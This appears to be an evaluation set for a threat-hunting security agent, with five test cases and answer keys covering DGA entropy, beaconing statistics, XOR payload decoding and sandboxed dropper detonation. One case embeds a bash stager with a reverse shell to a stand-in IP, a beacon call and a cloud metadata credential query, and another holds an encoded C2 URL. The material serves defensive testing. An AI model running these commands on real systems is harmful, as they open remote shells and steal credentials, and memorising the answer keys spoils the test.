@@ -1,0 +1,141 @@
+{
+  "evalset_id": "threat_hunter_code_analytics",
+  "name": "Threat Hunter Code Execution & Advanced Analytics",
+  "description": "Evaluates Threat Hunter's ability to use sandboxed Python code execution for mathematical entropy, C2 beaconing jitter analysis, payload de-obfuscation (FLOSS pattern), and YARA rule validation",
+  "eval_cases": [
+    {
+      "eval_id": "hunt_dga_entropy_calculation",
+      "name": "Hunt - DGA Shannon Entropy Analysis",
+      "conversation": [
+        {
+          "role": "user",
+          "content": "Perform a threat hunt to analyze suspicious DNS requests observed in our Chronicle SIEM logs for workstation WRK-SHASEK. Use your sandboxed Python code execution environment to calculate the Shannon entropy for these queried domains to determine if a Domain Generation Algorithm (DGA) is active:\n1. 'portal.internal.corp'\n2. 'login.microsoftonline.com'\n3. 'xk92bvf0q81lzmn04.evil-c2.net'\n4. 'q7z9w8p3m2k1v5x.bad-infra.org'\nProvide the entropy values and identify the high-confidence DGA domains."
+        }
+      ],
+      "reference": {
+        "expected_specialist": "threat_hunter",
+        "tool_trajectory": ["search_security_events", "execute_code"],
+        "final_response_must_contain": [
+          "entropy",
+          "xk92bvf0q81lzmn04.evil-c2.net",
+          "DGA",
+          "Threat Hunter"
+        ],
+        "success_criteria": {
+          "specialist_attribution": true,
+          "calculates_entropy": true,
+          "identifies_dga_domains": true,
+          "leverages_code_execution": true
+        }
+      }
+    },
+    {
+      "eval_id": "hunt_c2_periodic_jitter_analytics",
+      "name": "Hunt - Automated C2 Beaconing & Jitter",
+      "conversation": [
+        {
+          "role": "user",
+          "content": "We noticed repeated outbound network connections from IP 10.0.1.45 to external IP 198.51.100.24 across the following timestamps:\n- 2026-08-31T12:00:00Z\n- 2026-08-31T12:01:00Z\n- 2026-08-31T12:02:01Z\n- 2026-08-31T12:03:00Z\n- 2026-08-31T12:04:02Z\nUse your Python Code Execution sandbox to calculate the inter-arrival intervals, mean interval, standard deviation, and coefficient of variation (CV). State whether this indicates automated periodic beaconing or human traffic."
+        }
+      ],
+      "reference": {
+        "expected_specialist": "threat_hunter",
+        "tool_trajectory": ["execute_code"],
+        "final_response_must_contain": [
+          "beaconing",
+          "interval",
+          "coefficient of variation",
+          "Threat Hunter"
+        ],
+        "success_criteria": {
+          "specialist_attribution": true,
+          "computes_statistical_jitter": true,
+          "confirms_periodic_beaconing": true,
+          "leverages_code_execution": true
+        }
+      }
+    },
+    {
+      "eval_id": "hunt_sandboxed_payload_deobfuscation",
+      "name": "Hunt - Layered Payload De-obfuscation & YARA Verification",
+      "conversation": [
+        {
+          "role": "user",
+          "content": "During triage of alert ALT-8921, an obfuscated PowerShell snippet was extracted from host WRK-PACMAN. The payload contains single-byte XOR encoded bytes with hex representation:\n'32 2e 2e 2a 29 60 75 75 3b 2a 2e 68 63 77 39 68 75 3f 2c 33 36 77 3e 35 37 3b 33 34 74 39 35 37 75 38 3f 3b 39 35 34'\nIn your secure Python sandbox, brute-force the XOR key to extract the cleartext C2 beacon URL (Mandiant FLOSS pattern). Then, synthesize and validate a YARA detection rule against this indicator, verifying syntax in the sandbox."
+        }
+      ],
+      "reference": {
+        "expected_specialist": "threat_hunter",
+        "tool_trajectory": ["execute_code", "save_report_artifact"],
+        "final_response_must_contain": [
+          "0x5A",
+          "apt29-c2.evil-domain.com/beacon",
+          "rule",
+          "Threat Hunter"
+        ],
+        "success_criteria": {
+          "specialist_attribution": true,
+          "recovers_c2_url": true,
+          "identifies_xor_key": true,
+          "validates_yara_rule": true
+        }
+      }
+    },
+    {
+      "eval_id": "hunt_dropper_detonation_and_forensics",
+      "name": "Hunt - Untrusted Dropper Detonation & Differential Forensics",
+      "conversation": [
+        {
+          "role": "user",
+          "content": "A suspicious bash stager script was recovered from an alert on host WRK-SHASEK:\n```bash\nmkdir -p /tmp/.hidden_beacon\necho 'MOCK_ENCRYPTED_DATA_LOCK' > /tmp/user_data.lock\necho 'bash -i >& /dev/tcp/198.51.100.1/4444 0>&1' > /tmp/.hidden_beacon/backdoor.sh\nchmod +x /tmp/.hidden_beacon/backdoor.sh\ncurl -s --connect-timeout 2 http://198.51.100.1/beacon || echo 'BEACON_BLOCKED'\ncurl -s --connect-timeout 2 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/ || echo 'METADATA_ACCESS_BLOCKED'\n```\nExecute this payload inside your secure Python Code Execution sandbox using `detonate_and_capture_forensics`. Inspect the differential filesystem to extract all dropped file artifacts, compute their SHA-256 hashes, and confirm whether C2 callbacks and metadata theft attempts were contained."
+        }
+      ],
+      "reference": {
+        "expected_specialist": "threat_hunter",
+        "tool_trajectory": ["execute_code", "save_report_artifact"],
+        "final_response_must_contain": [
+          "backdoor.sh",
+          "user_data.lock",
+          "SHA-256",
+          "contained",
+          "Threat Hunter"
+        ],
+        "success_criteria": {
+          "specialist_attribution": true,
+          "captures_dropped_files": true,
+          "calculates_artifact_hashes": true,
+          "verifies_c2_containment": true,
+          "leverages_code_execution": true
+        }
+      }
+    },
+    {
+      "eval_id": "hunt_zero_trust_containment_verification",
+      "name": "Hunt - Zero-Trust Boundary & Prompt Injection Containment",
+      "conversation": [
+        {
+          "role": "user",
+          "content": "We are conducting a security verification audit of our agent sandboxing environment. Run `verify_sandbox_containment` in your Code Execution Sandbox to prove zero-trust boundaries are enforced: verify that the GCP metadata server (169.254.169.254) cannot be queried for service account tokens, verify that host credentials and API keys are not leaked, and confirm that default-deny network egress prevents external exfiltration."
+        }
+      ],
+      "reference": {
+        "expected_specialist": "threat_hunter",
+        "tool_trajectory": ["execute_code"],
+        "final_response_must_contain": [
+          "metadata",
+          "shielded",
+          "egress",
+          "credentials",
+          "Threat Hunter"
+        ],
+        "success_criteria": {
+          "specialist_attribution": true,
+          "verifies_metadata_isolation": true,
+          "verifies_credential_shielding": true,
+          "verifies_network_containment": true,
+          "leverages_code_execution": true
+        }
+      }
+    }
+  ]
+}
